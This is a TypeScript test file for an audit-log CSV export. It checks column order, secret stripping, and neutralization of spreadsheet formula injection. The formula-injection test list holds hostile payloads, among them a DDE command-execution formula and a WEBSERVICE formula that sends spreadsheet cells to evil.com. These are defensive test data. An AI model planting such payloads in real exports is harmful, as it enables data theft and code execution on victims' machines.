import { describe, expect, test } from "bun:test";
import type { AuditLog } from "../services/audit.service.js";
import { AUDIT_EXPORT_COLUMNS, buildAuditExportCSV } from "./audit.js";

/**
 * The audit CSV export ships attacker-controlled cells (the Actor column,
 * sourced from `users.name`, which any member can set via `PATCH /auth/me`).
 *
 * These tests pin two things:
 *  - the column shape / happy-path output of the export, so a refactor cannot
 *    silently drop or reorder a column, and
 *  - the CSV-injection defense inherited from the shared CSV helpers
 *    (`neutralizeFormula`): a profile name starting with `=`, `+`, `-`, or `@`
 *    must be emitted as inert text, not a live spreadsheet formula.
 */
const FIXED_CREATED_AT = new Date("2026-09-08T12:00:00.000Z");

function makeLog(overrides: Partial<AuditLog> = {}): AuditLog {
  return {
    id: "log-1",
    userId: "user-1",
    action: "user.login",
    entityType: null,
    entityId: null,
    details: null,
    ipAddress: "127.0.0.1",
    createdAt: FIXED_CREATED_AT,
    actor: { id: "user-1", name: "Alice", email: "alice@example.com" },
    ...overrides,
  };
}

/**
 * Minimal RFC-4180-ish row parser so assertions can target a specific column
 * even when another column's value contains commas or quotes (the
 * WEBSERVICE+TEXTJOIN payload does both). A leading apostrophe is part of the
 * value, not a CSV delimiter, so it round-trips through the parser.
 */
function parseCSVRow(line: string): string[] {
  const cells: string[] = [];
  let i = 0;
  while (true) {
    if (i < line.length && line[i] === '"') {
      let value = "";
      i += 1; // skip the opening quote
      while (i < line.length) {
        if (line[i] === '"') {
          if (line[i + 1] === '"') {
            value += '"';
            i += 2;
          } else {
            i += 1; // skip the closing quote
            break;
          }
        } else {
          value += line[i];
          i += 1;
        }
      }
      cells.push(value);
    } else {
      let value = "";
      while (i < line.length && line[i] !== "," && line[i] !== '"') {
        value += line[i];
        i += 1;
      }
      cells.push(value);
    }
    if (i >= line.length) break;
    if (line[i] === ",") {
      i += 1;
      continue;
    }
    // Defensive bail: a well-formed row only has commas between fields.
    break;
  }
  return cells;
}

describe("audit CSV export column shape", () => {
  test("exposes the nine columns in the documented order", () => {
    expect(AUDIT_EXPORT_COLUMNS).toEqual([
      "ID",
      "Actor",
      "Actor Email",
      "Action",
      "Entity Type",
      "Entity ID",
      "Details",
      "IP Address",
      "Created At",
    ]);
  });

  test("the header row matches the column list verbatim", () => {
    const csv = buildAuditExportCSV([makeLog()]);
    expect(csv.split("\n")[0]).toBe(AUDIT_EXPORT_COLUMNS.join(","));
  });

  test("each data row has exactly one cell per column", () => {
    const csv = buildAuditExportCSV([makeLog()]);
    expect(parseCSVRow(csv.split("\n")[1])).toHaveLength(
      AUDIT_EXPORT_COLUMNS.length,
    );
  });
});

describe("audit CSV export happy path", () => {
  test("an ordinary row is emitted in order with no spurious quoting", () => {
    const csv = buildAuditExportCSV([makeLog()]);
    const expectedCells = [
      "log-1",
      "Alice",
      "alice@example.com",
      "user.login",
      "",
      "",
      "",
      "127.0.0.1",
      "2026-09-08T12:00:00.000Z",
    ];
    const lines = csv.split("\n");
    expect(lines[0]).toBe(AUDIT_EXPORT_COLUMNS.join(","));
    expect(lines[1]).toBe(expectedCells.join(","));
    expect(parseCSVRow(lines[1])).toEqual(expectedCells);
    expect(parseCSVRow(lines[1])).toHaveLength(AUDIT_EXPORT_COLUMNS.length);
  });

  test("a row with no actor falls back to 'System' in the Actor cell", () => {
    const csv = buildAuditExportCSV([makeLog({ actor: null })]);
    const cells = parseCSVRow(csv.split("\n")[1]);
    expect(cells[1]).toBe("System");
  });

  test("an actor with a null name falls back to 'System'", () => {
    const csv = buildAuditExportCSV([
      makeLog({ actor: { id: "user-1", name: null, email: "a@e.com" } }),
    ]);
    expect(parseCSVRow(csv.split("\n")[1])[1]).toBe("System");
  });

  test("details are sanitized (secrets stripped) and JSON-stringified", () => {
    const csv = buildAuditExportCSV([
      makeLog({
        details: {
          token: "leak",
          safe: "kept",
          nested: { password: "leak", note: "kept" },
        },
      }),
    ]);
    const detailsCell = parseCSVRow(csv.split("\n")[1])[6];
    const parsed = JSON.parse(detailsCell) as Record<string, unknown>;
    expect(parsed).not.toHaveProperty("token");
    expect(parsed).toHaveProperty("safe", "kept");
    const nested = parsed.nested as Record<string, unknown>;
    expect(nested).not.toHaveProperty("password");
    expect(nested).toHaveProperty("note", "kept");
  });

  test("multiple rows are emitted one per line in order", () => {
    const csv = buildAuditExportCSV([
      makeLog({ id: "log-a" }),
      makeLog({
        id: "log-b",
        actor: { id: "u2", name: "Bob", email: "bob@example.com" },
      }),
    ]);
    const lines = csv.split("\n");
    expect(lines).toHaveLength(3); // header + 2 rows
    expect(parseCSVRow(lines[1])[0]).toBe("log-a");
    expect(parseCSVRow(lines[2])[0]).toBe("log-b");
    expect(parseCSVRow(lines[2])[1]).toBe("Bob");
  });

  test("an empty log set still emits the header row", () => {
    const csv = buildAuditExportCSV([]);
    expect(csv).toBe(AUDIT_EXPORT_COLUMNS.join(","));
  });
});

describe("audit CSV export neutralizes spreadsheet formula injection", () => {
  // The profile-name schema only length-validates and trims, so these are all
  // values a default-privilege member can plant via PATCH /auth/me.
  const formulaPayloads = [
    "=1+1",
    "+1+1",
    "-2+3",
    "@SUM(1:99)",
    "=cmd|'/c calc'!A1",
    '=WEBSERVICE("http://evil.com/?"&TEXTJOIN("|",TRUE,C2:I50))',
  ];

  test.each(formulaPayloads)(
    "an Actor name of %j is neutralized to inert text and stays in one cell",
    (payload) => {
      const csv = buildAuditExportCSV([
        makeLog({
          actor: {
            id: "user-1",
            name: payload,
            email: "attacker@example.com",
          },
        }),
      ]);
      const row = csv.split("\n")[1];
      const cells = parseCSVRow(row);

      // The quoting must hold: an injected formula containing commas/quotes
      // cannot split the row or escape its cell.
      expect(cells).toHaveLength(AUDIT_EXPORT_COLUMNS.length);

      const actorCell = cells[1];

      // A leading apostrophe forces the spreadsheet to read the cell as
      // literal text, and the visible content still round-trips the payload.
      expect(actorCell.startsWith("'")).toBe(true);
      expect(actorCell).toBe(`'${payload}`);
    },
  );

  test("the neutralizing apostrophe lands inside the quotes for a formula that also needs quoting", () => {
    // A payload with both a comma and a quote is quoted by the CSV helper; the
    // apostrophe must be inside the quotes or the quoting is broken and the
    // formula escapes on unquoting (see csv.test.ts for the same invariant).
    const payload = '=HYPERLINK("http://evil","x"),y';
    const csv = buildAuditExportCSV([
      makeLog({
        actor: {
          id: "user-1",
          name: payload,
          email: "attacker@example.com",
        },
      }),
    ]);
    const row = csv.split("\n")[1];
    const actorCell = parseCSVRow(row)[1];
    expect(actorCell).toBe(`'${payload}`);
    expect(row).toContain(`"'=HYPERLINK`);
  });

  test("non-formula Actor names are left untouched (no regression)", () => {
    for (const name of ["Alice", "O'Brien", "Jean-Luc", "Ana + Bob"]) {
      const csv = buildAuditExportCSV([
        makeLog({
          actor: { id: "u", name: name, email: "x@e.com" },
        }),
      ]);
      const actorCell = parseCSVRow(csv.split("\n")[1])[1];
      // No leading apostrophe is added to a name that is not a formula.
      expect(actorCell.startsWith("'")).toBe(false);
      expect(actorCell).toBe(name);
    }
  });
});
